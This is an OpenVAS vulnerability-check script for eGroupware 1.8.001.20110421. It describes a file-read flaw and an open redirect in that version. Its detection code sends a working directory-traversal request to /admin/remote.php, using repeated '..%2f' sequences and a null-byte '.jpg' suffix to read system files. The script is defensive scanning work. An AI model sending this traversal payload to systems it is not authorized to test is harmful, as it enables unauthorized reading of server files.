###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_egroupware_mult_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# eGroupware Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application or to
redirect to an arbitrary URL.

Impact Level: Application";

tag_affected = "eGroupware version 1.8.001.20110421";

tag_insight = "Multiple flaws are due to:
- An input validation error in 'type' parameter to '/admin/remote.php?', which
  allows attackers to read arbitrary files via a ..%2f(dot dot) sequences.
- An open redirect vulnerability in '/phpgwapi/ntlm/index.php?', when handling
  the URL.";

tag_solution = "Upgrade to version 1.8.001.20110805 or later,
For updates refer to http://www.egroupware.org";

tag_summary = "This host is running the eGroupware and is prone to multiple
vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.801944";
CPE = "cpe:/a:egroupware:egroupware";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_cve_id("CVE-2011-4951","CVE-2011-4950","CVE-2011-4949","CVE-2011-4948");
  script_bugtraq_id(52770);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("eGroupware Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17322/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101676/eGroupware1.8.001.20110421-LFI.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101675/eGroupware1.8.001.20110421-Redirect.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_egroupware_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("egroupware/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Get eGroupware Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/admin/remote.php?uid=a&type=",
               crap(data:"..%2f",length:3*15), files[file],
               "%00.jpg&creator_email=a");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url,pattern:file))
  {
    security_message(port:port);
    exit(0);
  }
}
